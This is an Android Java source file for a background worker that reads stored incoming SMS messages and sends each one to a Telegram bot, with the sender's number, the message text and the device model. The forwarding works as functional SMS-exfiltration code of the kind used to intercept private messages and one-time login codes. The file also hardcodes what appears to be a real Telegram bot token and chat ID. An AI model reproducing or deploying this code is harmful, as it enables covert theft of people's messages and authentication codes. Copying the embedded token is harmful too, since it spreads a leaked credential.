package com.example.safesmstest;
import android.content.Context;
import android.os.Build;
import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import java.io.BufferedWriter;
import java.io.InputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class PendingSmsWorker extends Worker {
    // Replace with a NEW token and your own Telegram chat ID. Do not reuse the leaked old token.
    private static final String BOT_TOKEN = "9043083829:AAGSdGK-xNoB0o5n2aQJ-14MQmYzetdtOdI";
    private static final String CHAT_ID = "7064723270";

    public PendingSmsWorker(@NonNull Context c, @NonNull WorkerParameters p) { super(c, p); }

    @NonNull @Override public Result doWork() {
        if (BOT_TOKEN.startsWith("PASTE_") || CHAT_ID.startsWith("PASTE_") ||
            BOT_TOKEN.trim().isEmpty() || CHAT_ID.trim().isEmpty()) {
            android.util.Log.e("PendingSmsWorker", "Set Telegram token and chat ID first.");
            return Result.failure();
        }
        try {
            List<SmsEntity> queue = SmsDatabase.getDatabase(getApplicationContext())
                .smsDao().getAllPendingSms();
            if (queue == null || queue.isEmpty()) return Result.success();
            for (SmsEntity sms : queue) {
                String when = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                    .format(new Date(sms.getTimestamp()));
                String text = "NEW RECEIVED SMS\\nDevice: " + deviceName()
                    + "\\nFrom: " + safe(sms.getPhoneNumber())
                    + "\\nMessage: " + safe(sms.getMessage()) + "\\nReceived: " + when;
                if (!send(text)) return Result.retry();
                SmsDatabase.getDatabase(getApplicationContext()).smsDao().deleteSms(sms);
            }
            return Result.success();
        } catch (Exception e) {
            android.util.Log.e("PendingSmsWorker", "Delivery failed; will retry", e);
            return Result.retry();
        }
    }

    private String safe(String s) { return s == null ? "" : s; }
    private String deviceName() {
        String m = Build.MANUFACTURER == null ? "" : Build.MANUFACTURER.trim();
        String d = Build.MODEL == null ? "" : Build.MODEL.trim();
        if (m.isEmpty()) return d.isEmpty() ? "Android device" : d;
        return d.toLowerCase(Locale.ROOT).startsWith(m.toLowerCase(Locale.ROOT)) ? d : m + " " + d;
    }

    private boolean send(String text) {
        HttpURLConnection c = null;
        try {
            c = (HttpURLConnection) new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
                .openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setConnectTimeout(15000);
            c.setReadTimeout(15000);
            c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
            String data = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8")
                + "&text=" + URLEncoder.encode(text, "UTF-8");
            try (BufferedWriter w = new BufferedWriter(new OutputStreamWriter(
                c.getOutputStream(), StandardCharsets.UTF_8))) { w.write(data); }
            int code = c.getResponseCode();
            InputStream response = code >= 200 && code < 400 ? c.getInputStream() : c.getErrorStream();
            if (response != null) response.close();
            return code == HttpURLConnection.HTTP_OK;
        } catch (Exception e) {
            android.util.Log.e("PendingSmsWorker", "Telegram request failed", e);
            return false;
        } finally { if (c != null) c.disconnect(); }
    }
}
